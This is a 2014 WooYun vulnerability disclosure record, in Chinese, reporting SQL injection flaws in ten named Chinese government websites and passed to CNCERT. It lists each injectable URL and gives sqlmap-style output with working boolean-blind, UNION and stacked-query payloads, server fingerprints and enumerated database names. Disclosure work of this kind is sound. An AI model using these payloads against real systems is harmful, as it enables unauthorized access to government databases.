{"id": 51000, "wybug_id": "wooyun-2014-076077", "wybug_title": "政府网站SQL注入漏洞10枚打包", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "Coffee", "wybug_date": "2014-09-15 14:03", "wybug_open_date": "2014-10-30 14:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-30：\t细节向公众公开  简要描述： 政府网站SQL注入漏洞10枚打包。本来找了好几十个，参照着老和尚找的800个的去个重，就只剩这么点了，真伤心。顺便挑着测了下老和尚那800多个。里面很多网站是有WAF的，注起来很困难，还有一些感觉像是误报（要不就是我太弱了）。不过这个数量真是得膜拜一下。纯手工找了半天，看在这么辛苦的份上……求过，求前台。 详细说明：  注入点：http://www.fjnh.gov.cn/xxgk/xx_Search.asp?Unit_ID=15 宁化县政府http://www.dxwsj.gov.cn/show_news.asp?ID=3246 达州市达川区卫生局http://www.gzpf.gov.cn/pf/program/html/site_news_content.php?SiteID=1&ItemID=536042407&ID=903 广州普法网http://www.jllh.gov.cn/el/dis_news.php?disis=202 柳河县人民政府http://www.ahcss.gov.cn/include/web_content.php?id=2061 安徽省政府参事室http://www.systats.gov.cn/ndtjgb_page.php?xuh=1697 三亚市统计局http://www.gz.stats.gov.cn/SurveyInfo/VotesTheme.aspx?id=1 贵州省统计局http://www.longxi.gansu.gov.cn/showxw.asp?id=14040 陇西政府http://www.snsanyuan.gov.cn/knry.jsp?urltype=news.NewsContentUrl&wbtreeid=1054&wbnewsid=29277 三原县人民政府http://www.hljboli.gov.cn/mome.asp?id=1 勃利县政府说明：后几个 and 1=1 和 and 1=2 返回值不同可以确定漏洞存在，但工具没有跑出来，就不手工证明了。   漏洞证明：  跑了下部分注入点：http://www.fjnh.gov.cn/xxgk/xx_Search.asp?Unit_ID=15:Place: GETParameter: Unit_ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: Unit_ID=15 AND 6684=6684    Type: UNION query    Title: Generic UNION query (NULL) - 2 columns    Payload: Unit_ID=-5959 UNION ALL SELECT NULL,CHAR(113)+CHAR(100)+CHAR(111)+CHAR(101)+CHAR(113)+CHAR(89)+CHAR(70)+CHAR(90)+CHAR(99)+CHAR(76)+CHAR(90)+CHAR(106)+CHAR(69)+CHAR(115)+CHAR(75)+CHAR(113)+CHAR(97)+CHAR(103)+CHAR(114)+CHAR(113)--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: Unit_ID=15; WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000available databases [9]:[*] master[*] model[*] msdb[*] nh090624xxgk[*] nhzfb090608[*] Northwind[*] pubs[*] smxxgk2013[*] tempdbhttp://www.dxwsj.gov.cn/show_news.asp?ID=3246:Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=3246 AND 4212=4212---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft AccessDatabase: Microsoft_Access_masterdb[1 table]+-------+| admin |+-------+http://www.gzpf.gov.cn/pf/program/html/site_news_content.php?SiteID=1&ItemID=536042407&ID=903：Place: GETParameter: SiteID    Type: UNION query    Title: MySQL UNION query (NULL) - 3 columns    Payload: SiteID=1 UNION ALL SELECT CONCAT(0x7171706371,0x4d557169557a61736d53,0x7177716271),NULL,NULL#&ItemID=536042407&ID=903---web server operating system: Linux Debian 3.1 (sarge)web application technology: Apache 2.0.54, PHP 4.3.10back-end DBMS: MySQL 4available databases [1]:[*] dbGZPF_2005http://www.jllh.gov.cn/el/dis_news.php?disis=202：Place: GETParameter: disis    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: disis=202 AND 3799=3799    Type: UNION query    Title: MySQL UNION query (NULL) - 5 columns    Payload: disis=-8907 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71756d7771,0x41796c6d7543616d6e47,0x7173646571)#---web server operating system: Windowsweb application technology: PHP 4.3.2, Apache 2.0.52back-end DBMS: MySQL 4available databases [1]:[*] liuhe   修复方案：  过滤。顺便说我感觉现在政府网站的注入真的不那么好找了，而且基本都带着WAF。祝政府部门信息安全做的越来越好。应该可以20RANK吧^_^   版权声明：转载请注明来源 Coffee@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-20 08:55 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}